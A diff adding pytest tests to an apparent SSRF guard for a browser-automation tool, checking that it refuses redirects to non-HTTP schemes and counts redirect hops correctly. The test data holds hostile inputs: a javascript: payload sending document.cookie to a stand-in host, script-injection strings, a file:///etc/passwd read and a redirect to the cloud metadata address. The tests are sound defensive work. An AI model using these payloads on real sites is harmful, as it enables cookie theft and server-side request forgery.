@@ -308,3 +308,80 @@ async def test_a_websocket_is_closed_or_connected_by_verdict(url: str, blocked: 
     ws = _WebSocketRoute(url)
     await _handle_websocket(ws)
     assert (ws.closed, ws.connected) == (blocked, not blocked)
+
+
+@pytest.mark.parametrize(
+    "location",
+    [
+        "javascript:fetch('//evil.test/?c='+document.cookie)",
+        "JavaScript:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "blob:https://public.test/0f0e0d0c-0000-0000-0000-000000000000",
+        "file:///etc/passwd",
+        "about:blank",
+    ],
+)
+async def test_a_redirect_to_a_non_http_scheme_is_refused_before_any_document(location: str) -> None:
+    """A browser treats a 3xx to any non-HTTP(S) scheme as a network error.
+
+    Served as a client redirect instead, ``javascript:`` ran as script in the
+    redirecting URL's origin -- the scheme passed the host check because the
+    policy has no host to check for it.
+    """
+    request = _Request("https://trusted.test/open-redirect")
+    route = _Route({"https://trusted.test/open-redirect": _Response(302, location)}, request)
+    await _handle(route, request)
+    assert route.aborted == "blockedbyclient"
+    assert route.fulfilled is None and route.fulfilled_body is None
+
+
+async def _hop(hops: _HopCounter, frame: _Frame, url: str, response: _Response | None) -> _Route:
+    """One navigation in *frame*; ``None`` makes its fetch fail."""
+    request = _Request(url, frame=frame)
+    route = _Route({url: response} if response is not None else {}, request)
+    if response is None:
+
+        async def failing(*_args: Any, **_kwargs: Any) -> _Response:
+            raise RuntimeError("connection reset")
+
+        route.fetch = failing  # type: ignore[method-assign]
+    await _handle(route, request, hops)
+    return route
+
+
+@pytest.mark.parametrize("ending", ["blocked", "failed"])
+async def test_a_chain_that_ends_in_an_abort_does_not_count_against_the_next(ending: str) -> None:
+    """18 hops and then a refusal or a failed fetch: the next 3-hop chain is its own."""
+    hops = _HopCounter()
+    frame = _Frame()
+    for i in range(MAX_REDIRECT_HOPS - 2):
+        assert (await _hop(hops, frame, f"https://a.test/{i}", _Response(302, f"https://a.test/{i + 1}"))).aborted is None
+    last = f"https://a.test/{MAX_REDIRECT_HOPS - 2}"
+    if ending == "blocked":
+        end = await _hop(hops, frame, last, _Response(302, "http://169.254.169.254/"))
+        assert end.aborted == "blockedbyclient"
+    else:
+        end = await _hop(hops, frame, last, None)
+        assert end.aborted == "failed"
+    for step in ("https://sso.test/1", "https://sso.test/2", "https://sso.test/3"):
+        route = await _hop(hops, frame, step, _Response(302, step + "x"))
+        assert route.aborted is None, f"{step} was refused: the aborted chain's hops were still counted"
+
+
+async def test_a_request_without_a_frame_is_logged_not_silently_skipped(monkeypatch: pytest.MonkeyPatch) -> None:
+    from octowright import ssrf_guard
+
+    class _Frameless:
+        @property
+        def frame(self) -> Any:
+            raise RuntimeError("service worker")
+
+    seen: list[str] = []
+
+    class _Log:
+        def debug(self, event: str, **_kw: Any) -> None:
+            seen.append(event)
+
+    monkeypatch.setattr(ssrf_guard, "log", _Log())
+    assert _HopCounter._frame(_Frameless()) is None
+    assert seen == ["octowright.ssrf.request_without_frame"]
